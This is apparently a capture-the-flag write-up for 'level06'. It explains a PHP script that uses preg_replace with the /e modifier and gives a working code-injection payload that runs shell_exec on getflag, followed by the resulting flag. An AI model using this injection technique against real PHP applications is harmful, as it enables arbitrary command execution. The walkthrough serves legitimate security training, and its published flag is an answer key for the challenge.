# Step 1

Landing on `level06`, we find a PHP script that reads a file and replaces some characters.

```php
#!/usr/bin/php
<?php
// replace all occurences of . with x and @ with y
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}


function x($y, $z) {
    // put the content of the file in $a
    $a = file_get_contents($y);
    // replace all occurences of [x ...] with the result of y("...")
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    // Replaces all opening square brackets ([) with opening parentheses (().
    $a = preg_replace("/\[/", "(", $a);
    // Replaces all closing square brackets ([) with closing parentheses (().
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}

// argv[2] is never used
// argv[1] is a file path
$r = x($argv[1], $argv[2]);
print $r;
?>
```

> `/(\[x (.*)\])/e`: The `e` modifier will execute the replacement as PHP code.
>
> `y(\"\\2\")`" The replacement is the result of the `y` function with the content of the second capturing group as argument.

# Step 2
The goal is to inject PHP code that executes the `getflag` command with the `shell_exec` function through the `y` function.

```bash
echo '[x {${shell_exec(getflag)}}]' > /tmp/getflag.txt
./level06 /tmp/getflag.txt
```

### Result

flag06: `wiok45aaoguiboiki2tuin6ub`

No password needed for `flag06` user.
